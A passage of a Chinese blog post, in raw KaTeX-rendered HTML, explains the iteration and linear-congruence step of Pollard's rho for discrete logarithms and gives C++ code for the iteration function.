class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">while</span></span></span><span class=\"mspace\"> </span><span class=\"mord mathnormal\">x</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\"><span class=\"mord vbox\"><span class=\"thinbox\"><span class=\"rlap\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"inner\"><span class=\"mrel\"></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mrel\">=</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span></span></span><span style=\"top:-3.9099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">←</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span><span style=\"top:-2.4099999999999993em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">←</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span><span style=\"top:-0.9099999999999988em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">←</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span><span style=\"top:0.5900000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">解线性同余方程</span><span class=\"mord\">:</span></span></span></span><span style=\"top:2.0900000000000007em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">2</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mopen\">(</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.750000000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span></span></span></span> 的计算如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>a</mi><mo separator=\"true\">,</mo><mi>b</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">(</mo><mi>β</mi><mi>x</mi><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>a</mi><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>x</mi><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mn>3</mn><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>2</mn><mi>a</mi><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>2</mn><mi>b</mi><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>x</mi><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mn>3</mn><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">(</mo><mi>α</mi><mi>x</mi><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>x</mi><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mn>3</mn><mo>=</mo><mn>2</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding=\"application/x-tex\">f(x,a,b)=\n\\begin{cases}\n(\\beta x ,&amp; a,&amp; (b+1)\\bmod n &amp;), &amp;&amp; x\\bmod3=1\\\\\n(x^2 ,&amp; 2a ,&amp; 2b\\bmod n &amp;), &amp;&amp; x\\bmod3=0\\\\\n(\\alpha x ,&amp; (a+1)\\bmod n ,&amp; b &amp;), &amp;&amp; x\\bmod3=2\n\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:4.32em;vertical-align:-1.9099999999999997em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.35002em;\"><span style=\"top:-2.19999em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎩</span></span></span><span style=\"top:-2.19499em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-2.20499em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-3.15001em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎨</span></span></span><span style=\"top:-4.2950099999999996em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.30501em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎪</span></span></span><span style=\"top:-4.60002em;\"><span class=\"pstrut\" style=\"height:3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎧</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8500199999999998em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mpunct\">,</span></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"mord mathnormal\">a</span><span class=\"mpunct\">,</span></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">n</span></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">n</span></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mclose\">)</span><span class=\"mpunct\">,</span></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mclose\">)</span><span class=\"mpunct\">,</span></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mclose\">)</span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.41em;\"><span style=\"top:-4.41em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span></span></span><span style=\"top:-2.97em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">0</span></span></span><span style=\"top:-1.5300000000000002em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9099999999999997em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p>这里我对输入和输出是否为为同一变量分别作了实现避免 C++ 未定义行为（我真的怕极了，不想在遇到 undefined behavior 了）：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(Int <span class=\"type\">const</span> &amp; x, <span class=\"type\">__uint128_t</span> <span class=\"type\">const</span> &amp; a, <span class=\"type\">__uint128_t</span> <span class=\"type\">const</span> &amp; b, Int &amp; x_, <span class=\"type\">__uint128_t</span> &amp; a_, <span class=\"type\">__uint128_t</span> &amp; b_)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(x.<span class=\"built_in\">mod3</span>())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>: &#123;</span><br><span class=\"line\">            x_ = beta * x;</span><br><span class=\"line\">            a_ = a;</span><br><span class=\"line\">            b_ = (b + <span class=\"number\">1</span>) % n;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">0</span>: &#123;</span><br><span class=\"line\">            x_ = x * x;</span><br><span class=\"line\">            a_ = (a * <span class=\"number\">2</span>) % n;</span><br><span class=\"line\">            b_ = (b * <span class=\"number\">2</span>) % n;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>: &#123;  <span class=\"comment\">// 2</span></span><br><span class=\"line\">            x_ = alpha * x;</span><br><span class=\"line\">            a_ = (a + <span class=\"number\">1</span>) % n;</span><br><span class=\"line\">            b_ = b;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(Int &amp; x, <span class=\"type\">__uint128_t</span> &amp; a, <span class=\"type\">__uint128_t</span> &amp; b)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(x.<span class=\"built_in\">mod3</span>())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>: &#123;</span><br><span class=\"line\">            x = beta * x;</span><br><span class=\"line\">            a = a;</span><br><span class=\"line\">            b = (b + <span class=\"number\">1</span>) % n;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">0</span>: &#123;</span><br><span class=\"line\">            x = x * x;</span><br><span class=\"line\">            a = (a * <span class=\"number\">2</span>) % n;</span><br><span class=\"line\">            b = (b * <span class=\"number\">2</span>) % n;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>: &#123;  <span class=\"comment\">// 2</span></span><br><span class=\"line\">            x = alpha * x;</span><br><span class=\"line\">            a = (a + <span class=\"number\">1</span>) % n;</span><br><span class=\"line\">            b = b;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后求最终 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>b</mi><mn>2</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>a</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">b1,b2,a1,a2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" 